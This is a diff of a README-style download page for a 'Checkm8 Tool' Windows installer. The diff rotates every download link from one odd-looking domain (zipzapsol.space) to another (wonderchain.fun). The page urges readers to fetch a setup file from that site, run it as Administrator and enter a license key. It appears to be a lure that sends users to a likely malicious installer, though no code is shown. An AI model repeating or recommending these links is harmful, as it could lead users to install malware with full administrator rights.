@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Checkm8 Tool** for Windows.
 
 <p align="center">
-  <a href="https://descargar-checkm8.zipzapsol.space/">
+  <a href="https://descargar-checkm8.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Checkm8%20Tool-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Checkm8 Tool">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[descargar-checkm8.zipzapsol.space](https://descargar-checkm8.zipzapsol.space/)** |
-| **Full URL** | `https://descargar-checkm8.zipzapsol.space/` |
+| **Direct link** | **[descargar-checkm8.wonderchain.fun](https://descargar-checkm8.wonderchain.fun/)** |
+| **Full URL** | `https://descargar-checkm8.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — descargar-checkm8.zipzapsol.space](https://descargar-checkm8.zipzapsol.space/)** (link above)
+1. Click **[Download — descargar-checkm8.wonderchain.fun](https://descargar-checkm8.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://descargar-checkm8.zipzapsol.space/"><strong>⬇ Download Checkm8 Tool now</strong></a></p>
+<p align="center"><a href="https://descargar-checkm8.wonderchain.fun/"><strong>⬇ Download Checkm8 Tool now</strong></a></p>
 
 ---
 
